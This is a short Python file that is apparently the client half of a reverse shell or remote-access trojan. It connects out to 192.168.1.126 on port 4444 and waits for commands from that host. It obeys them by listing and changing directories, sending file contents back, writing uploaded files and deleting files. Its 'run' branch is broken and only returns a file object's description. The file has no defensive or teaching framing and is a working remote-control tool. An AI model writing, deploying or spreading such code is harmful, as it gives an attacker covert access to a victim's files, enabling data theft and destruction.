import socket, os

class server_config():
	def __init__(self, host, port):
		self.host = host
		self.port = port
		
	def server_connection(self):
		global server
		server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		server.connect((self.host, self.port))
		
	def server_package(self):

		while True:
			raw_package = server.recv(1024)
			raw_package = raw_package.decode()

			if raw_package == 'exit':
				server.close()

			elif raw_package == 'pwd':
				system_command = os.getcwd()
				system_command = str(system_command)
				server.send(system_command.encode())

			elif raw_package == 'cd':
				dir_package = server.recv(5000)
				dir_package = dir_package.decode()
				system_command = os.chdir(dir_package)
				system_command = str(system_command)
				server.send(system_command.encode())

			elif raw_package == 'ls':
				system_command = os.listdir()
				system_command = str(system_command)
				server.send(system_command.encode())

			elif raw_package == 'cat':
				dir_package = server.recv(5000)
				dir_package = dir_package.decode()
				file_package = open(dir_package, 'rb')
				file_data = file_package.read()
				server.send(file_data)

			elif raw_package == 'get':
				dir_package = server.recv(5000)
				dir_package = dir_package.decode()
				file_package = open(dir_package, 'rb')
				file_data = file_package.read()
				server.send(file_data)

			elif raw_package == 'put':
				file_name = server.recv(5000)
				file_package = open(file_name, 'wb')
				file_data = server.recv(5000)
				file_package.write(file_data)
				file_package.close()

			elif raw_package == 'del':
				file_package = server.recv(5000)
				file_package = file_package.decode()
				os.remove(file_package) 

			elif raw_package == 'run':
				dir_package = server.recv(5000)
				dir_package = dir_package.decode()
				file_package = open(dir_package)
				file_package = str(file_package)
				server.send(file_package.encode())

config = server_config('192.168.1.126', 4444)
config.server_connection()
config.server_package()